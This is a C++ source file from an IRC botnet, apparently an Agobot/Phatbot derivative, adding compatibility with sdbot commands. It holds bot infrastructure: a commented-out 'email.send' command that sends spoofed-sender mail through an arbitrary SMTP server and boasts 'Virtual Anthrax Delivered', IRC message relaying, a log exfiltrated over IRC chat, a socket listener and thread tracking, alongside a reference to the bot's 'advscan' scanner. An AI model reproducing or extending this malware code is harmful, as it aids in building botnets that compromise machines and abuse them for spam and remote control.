#include "main.h"
#include "sdcompat.h"
#include "mainctrl.h"
#include "advscan/defines.h"

void CsdbotCompat::Init() {
//	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdTest,	"sd.dot.test",	"testz0r",	this);
}

char * replacestr(char *str, char *oldstr, char *newstr);
void irc_privmsg(SOCKET sock,char *a,char *msgstr,bool notice);

/*int CsdbotCompat::Compat(char *a[32], bool notice, bool silent,char *msg_real_dest) {
	char sendbuf[512];int s=3;unsigned int sock=0;

	//insert if (strcmp(blahblah)) here for sdbot - didn't bother creating other irc functions yet for it. will when i'm not a lasy sob

	
	if (strcmp("email.send", a[s]) == 0 ) {
				WORD version = MAKEWORD(1,1);
				WSADATA wsaData;
				char server[256];
				int port;
				char sender_email[256];
				char recp_email[256];
				char subject[256];
				char BigBuf[1024];
				char myBuf[256];
				int nRet;
				strcpy(server,a[s+1]);
				port = atoi(a[s+2]);
				strcpy(sender_email,a[s+3]);
				strcpy(recp_email,a[s+4]);
				strcpy(subject,replacestr(a[s+5],"_"," "));
				WSAStartup(version, &wsaData);
				LPHOSTENT lpHostEntry;
				lpHostEntry = gethostbyname(server);
				SOCKET MailSocket;
				MailSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
				SOCKADDR_IN saServer;
				saServer.sin_family = AF_INET;
				saServer.sin_addr = *((LPIN_ADDR)*lpHostEntry->h_addr_list);
				saServer.sin_port = htons(port);

				nRet = connect(MailSocket, (LPSOCKADDR)&saServer, sizeof(struct sockaddr));

				sprintf(BigBuf,"HELO %s\n",server); 	nRet = send(MailSocket,  BigBuf, strlen(BigBuf), 0);

				sprintf(BigBuf,"MAIL FROM:%s\nRCPT TO: %s\n",sender_email,recp_email);	nRet = send(MailSocket,  BigBuf, strlen(BigBuf), 0);

				sprintf(BigBuf,"DATA\n"); 	nRet = send(MailSocket,  BigBuf, strlen(BigBuf), 0);

				sprintf(BigBuf,"Subject: %s\r\n",subject);				nRet = send(MailSocket,  BigBuf, strlen(BigBuf), 0);
				sprintf(BigBuf,"From: %s\r\n",sender_email);				nRet = send(MailSocket,  BigBuf, strlen(BigBuf), 0);
				sprintf(BigBuf,"To: %s\r\n",recp_email);				nRet = send(MailSocket,  BigBuf, strlen(BigBuf), 0);
				sprintf(BigBuf,"Content-Type: text/plain;\r\n\r\n");				nRet = send(MailSocket,  BigBuf, strlen(BigBuf), 0);
				sprintf(BigBuf,"%s\r\n",subject);				nRet = send(MailSocket,  BigBuf, strlen(BigBuf), 0);
				sprintf(BigBuf,".\r\n");				nRet = send(MailSocket,  BigBuf, strlen(BigBuf), 0);
				nRet = recv(MailSocket, myBuf, sizeof(myBuf), 0);
		
				closesocket(MailSocket);
				WSACleanup();
				sprintf(sendbuf, "Virtual Anthrax Delivered For %s",recp_email);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
			}


	
	return 0;
}*/

bool CsdbotCompat::HandleCommand(CMessage *pMsg) {	/*
	char *a[32];
	CString mSG;
	mSG.Format("%s PRIVMSG %s %s",pMsg->sSrc.Str(),pMsg->sDest.Str(),pMsg->sChatString.Mid(1).Str());
	
	a[0]=strtok(mSG.Str()," ");
	for (int i = 1; i < 32; i++) a[i] = strtok(NULL, " ");
Compat(a,pMsg->bNotice,pMsg->bSilent,pMsg->sDest.Str());*/
	return false; }


void irc_privmsg(SOCKET sock,char *a,char *msgstr,int notice){
	bool no;//no=notice=1?true:false;
	if(notice>=1)no=true;
	else no=false;
	
g_cMainCtrl.m_cIRC.SendMsg(false, no, msgstr, a);
}


// LET THE CONVERSIONS BEGIN!11

char log[LOGSIZE][LOGLINE];

void showlog(SOCKET sock, char *chan, BOOL notice, BOOL silent, char *filter){
	int entries = LOGSIZE, tmp = 0;

//	if (!silent) irc_privmsg(sock, chan, "-[Logs]-", notice);

	if (filter) {	if ((tmp = atoi(filter)) != 0)	entries = tmp;	}

	for (int i = 0, j = 0; i < LOGSIZE && j < entries; i++, j++) 
		if (log[i][0] != '\0') {
			if (!filter || tmp != 0)
				irc_privmsg(sock, chan, log[i], notice);
			else if (strstr(log[i], filter))
				irc_privmsg(sock, chan, log[i], notice);
		}
	
	return;
}

BOOL searchlog(char *filter){
	for (int i = 0; i < LOGSIZE; i++) 
		if (log[i][0] != '\0') {
			if (strstr(log[i], filter))
				return TRUE;
		}
	
	return FALSE;
}

void addlog(char *desc){
	SYSTEMTIME st;

	GetLocalTime(&st);

	for (register int i = LOGSIZE; i >= 0; i--) 
		if (log[i][0] != '\0') 
			strncpy(log[i+1], log[i], sizeof(log[i+1])-1);
	_snprintf(log[0], sizeof(log[0]), "[%.2d-%.2d-%4d %.2d:%.2d:%.2d] %s", st.wMonth, st.wDay, st.wYear, st.wHour, st.wMinute, st.wSecond, desc);

	return;
}


 char * replacestr(char *str, char *oldstr, char *newstr)
 {
	char *p;
	char str2[512];
	char str3[512];
	char str4[512];

	memset(str2, 0, sizeof(str2));
	memset(str3, 0, sizeof(str3));
	memset(str4, 0, sizeof(str4));
	strncpy(str2,  str, sizeof(str2)-1);
	if (strlen(newstr) > 384) newstr[384] = '\0';

	while (strstr(str2, oldstr) != NULL) {
		p = strstr(str2, oldstr);
		strncpy(str4,  p + strlen(oldstr), sizeof(str4)-1);
		p[0] = '\0';
		strncpy(str3,  str2, sizeof(str3)-1);
		if (p+1 != NULL && oldstr-1 != NULL) if (strlen(p+1) > strlen(oldstr-1)) sprintf(str2, "%s%s%s", str3, newstr, str4);
		 else sprintf(str2, "%s%s", str3, newstr);
		if (strstr(oldstr, newstr) != NULL) break;
	}
	strncpy(str,  str2, strlen(str2)+1);
	return str;
 }


 

  SOCKET Listen(int port) {
	  thred * threds = g_cMainCtrl.m_SdCompat.threds;
	SOCKET sock;
	SOCKADDR_IN  SockAddr;
   	if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) 
      		return -1;
	memset(&SockAddr, 0, sizeof(SockAddr));
   	SockAddr.sin_family = AF_INET;
   	SockAddr.sin_port = htons(port);
	SockAddr.sin_addr.s_addr = INADDR_ANY;  
	if (bind(sock, (SOCKADDR *)&SockAddr, sizeof(SockAddr)) != 0) 
		return -1;//port is in use ?
	if (listen(sock, SOMAXCONN) != 0) 
		return -1;
	return sock;
 }

   int spyaddthread(char *name,SOCKET sock,HANDLE Threat_Handle,int id,char * dir) {
	   thred * threds = g_cMainCtrl.m_SdCompat.threds;
	int c;
	for (c=0;c <= 40;c++)
		if (threds[c].id == 0) break;
	if (c > 19) return -1;
	sprintf(threds[c].name,name);
	threds[c].id = id;
	threds[c].num = c;
	threds[c].sock = sock;
	threds[c].Threat_Handle = Threat_Handle;
	sprintf(threds[c].dir,dir);
	return c;
 }

int addthread(char *name,SOCKET sock,HANDLE Threat_Handle,int id,char * dir){
	thread * threads = g_cMainCtrl.m_SdCompat.threads;
	int c;
	for (c=0;c <= 40;c++)
		if (threads[c].id == 0) break;
	if (c > 19) return -1;
	sprintf(threads[c].name,name);
	threads[c].id = id;
	threads[c].num = c;
	threads[c].sock = sock;
	threads[c].Threat_Handle = Threat_Handle;
	sprintf(threads[c].dir,dir);
	return c;
}
